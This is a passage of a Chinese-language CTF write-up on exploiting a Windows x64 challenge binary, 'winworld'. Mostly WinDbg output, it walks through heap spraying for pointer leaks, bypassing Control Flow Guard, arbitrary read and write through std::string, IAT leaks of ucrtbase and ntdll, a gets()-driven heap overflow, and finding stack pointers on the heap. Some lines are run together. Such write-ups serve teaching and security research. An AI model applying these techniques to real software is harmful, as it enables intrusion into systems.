     payload += struct.pack(" g
    (1a00.c68): Access violation - code c0000005 (first chance)
    First chance exceptions are reported before any exception handling.
    This exception may be expected and handled.
    ntdll!LdrpValidateUserCallTarget+0xe:
    00007ffa`89b164ae 488b14c2 mov rdx,qword ptr [rdx+rax*8] ds:010986ff`08d30908=????????????????
    0:000> ? rax > friends来循环测试，我们使用7-9 friends能得到一些东西：
    0:004> g
    Breakpoint 0 hit
    winworld!Person::printInfos:
    00007ff7`9b9f0890 4c8bdc mov r11,rsp
    0:000> dq rcx
    000001cf`94daea60 00007ff7`9b9ef700 000001cf`94d949b0000001cf`94daea70 000001cf`94d94a20 000001cf`94d94a40
    000001cf`94daea80 000001cf`94dac6c0 000001cf`94dac760
    000001cf`94daea90 000001cf`94dac780 00736572`6f6c6f44
    000001cf`94daeaa0 61742074`73657567 00000000`00000007
    000001cf`94daeab0 00000000`0000000f 00000002`00000000
    000001cf`94daeac0 00000000`20010001 00000000`00000000
    000001cf`94daead0 0000003d`00000020 0000000a`00000004
    0:000> !heap -x 000001cf`94d949b0Entry User Heap Segment Size PrevSize Unused Flags
    -------------------------------------------------------------------------------------------------------------    000001cf94d949a0 000001cf94d949b0 000001cf94d30000 000001cf94dafb50 a0 - 10 LFH;busy 
    0:000> dq 000001cf`94d949b0000001cf`94d949b0 000001cf`94dfb410 000001cf`94d90ce0
    000001cf`94d949c0 000001cf`94dac580 000001cf`94d90800
    000001cf`94d949d0 000001cf`94d98f90 000001cf`94d911c0
    000001cf`94d949e0 000001cf`94d99030 000001cf`94d912e0 # string pointer000001cf`94d949f0 000001cf`94db4cf0 000001cf`94d91180 # string size000001cf`94d94a00 000001cf`94db7e60 000001cf`94d912a0
    000001cf`94d94a10 000001cf`94e97c70 000001cf`94d91300
    000001cf`94d94a20 7320756f`590a2e73 73696874`20776f68
    0:000> dps poi(000001cf`94d949b0+8+0n24*2) L3000001cf`94d912e0 00007ff7`9b9f7158 winworld!std::_Ref_count::`vftable'000001cf`94d912e8 00000001`00000005
    000001cf`94d912f0 000001cf`94d99030
这个vector现在属于和Person对象相同的LFH。如果我们喷射0xf0字符串接着0x10 7-friends
vectors，我们能够泄漏指针：在winworld中的一个虚表地址和堆。我们应该能用0xff字符串来做到这个，然后是一个friends
vectors，但是有一些分配有时会发生，我还没调试出什么引起的。
尽管我们不能控制大小，它是巨大的，因此二进制不可避免的将崩溃！好消息是Windows上的堆和栈的随机只在每次启动时发生一次。每个进程都随机好了。这是不好的，但是因为二进制文件自动重启不是个问题，因此我们已经泄露了模块基地址，并且我们能够在子过程中复用它。
注意：当你开发一个Windows利用时，不要把二进制文件放在linux主机共享中，这会导致每次执行都随机化！
**  
**
**0x05 绕过CFG**
CFG是微软的控制流完整性方案，它基于任何非直接调用必须指向函数开头的简单思想。在非直接调用之前会有__guard_check_icall_fptr插入：
在Windows 10中这将调用ntdll!LdrpValidateUserCallTarget来检验指针是否是一个可靠的函数开头，如果不是则终止。
CFG的优势是能强制中断一个合法的程序（因此没有原因不使用它）。然而CFG有3个常见的缺陷：
1\. 与验证函数参数和返回值的类型的CFI机制相比， 被允许的目标的集合还是太大。
2\. 它不能保护栈，因为返回地址不是函数开头。微软将使用RFG来修复这个并且将来Intel处理器也支持，但是还是不够强。
3\. 如果加载了一个没有使用CFG编译的模块，该模块的所有的地址都是被允许的。JIT可能有问题。（这里的二进制和所有模块都支持CFG和没有JIT）
当我写这个文章的时候，一篇[ **绕过CFG的博文**](https://improsec.com/blog/bypassing-control-flow-guard-in-windows-10)
就已经发布了，即利用kernel32！RtlCaptureContext（缺陷1）。j00ru是唯一一个解决这个任务的人，使用它来泄漏栈，但是我没有使用这个，而是选择了手动泄漏/写栈（缺陷2）。
我们已经使用了std::string
name属性来实现任意读取，现在我们也能够使用它来实现任意写！唯一需要的是将字符串替换为不比当前std::string对象最大大小更多的字节。这非常酷，然而目前为止我们还不知道栈（或者堆）在哪里，并且每次运行程序的库都会随机。我们后面会回到这。首先我们也想泄漏其他库的地址。
**  
**
**0x06 泄漏其他库**
使用二进制基址和0x100个persons字符串的喷射，我们足够泄漏任意的内存地址。
我们能保留vectors为空字符串，来阻止调用Person::printInfos时崩溃。
现在我们已经有了二进制的基址，并且知道下次启动才会改变，泄漏其他库是个尝试：我们能转储IAT的入口。我的利用充分利用了ucrtbase.dll和ntdll.dll（在CFG中总是存在IAT），能通过构造一个std::string指向下面地址来完成泄漏：
    0:000> dps winworld+162e8 L1
    00007ff7`9b9f62e8 00007ffa`86d42360 ucrtbase!strtol
    0:000> dps winworld+164c0 L2
    00007ff7`9b9f64c0 00007ffa`89b164a0 ntdll!LdrpValidateUserCallTarget
    00007ff7`9b9f64c8 00007ffa`89b164f0 ntdll!LdrpDispatchUserCallTarget
重复泄漏，我们能用gets()的地址来覆盖onEncounter的方法指针，一旦我们定位了ucrtbase.dll的基址。这当然是因为这个任务特殊的上下文，其标准输入输出流重定向到了客户端套接字上。这将触发gets(this_object)堆溢出，我们能使用来覆盖名字字符串的属性。
**  
**
**0x07 泄漏栈**
在哪找栈指针？我们能从ntdll找到PEB的指针，然而在x64中PEB结构不包含指向TEB的指针。
一个最近的[ **j00ru的博文**](http://j00ru.vexillium.org/?p=2835)
描述了一个有趣的事实：尽管没有好的原因在堆上面存储栈指针，但是在进程初始化期间可能会有一些剩余的堆栈数据被无意复制到堆中。
他的博文在x86上描述了它，让我们在x64上面的堆中找下隐藏的栈指针：
    0:001> !address
    [...]
            BaseAddress      EndAddress+1        RegionSize     Type       State                 Protect             Usage
    --------------------------------------------------------------------------------------------------------------------------    [...]        3b`b6cfb000       3b`b6d00000        0`00005000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE                     Stack      [~0; 2524.1738]
    [...]
    0:001> !heap
     Heap Address NT/Segment Heap 17c262d0000 NT Heap
     17c26120000 NT Heap
    0:001> !address 17c262d0000 Usage: Heap
    Base Address: 0000017c`262d0000End Address: 0000017c`26332000[...]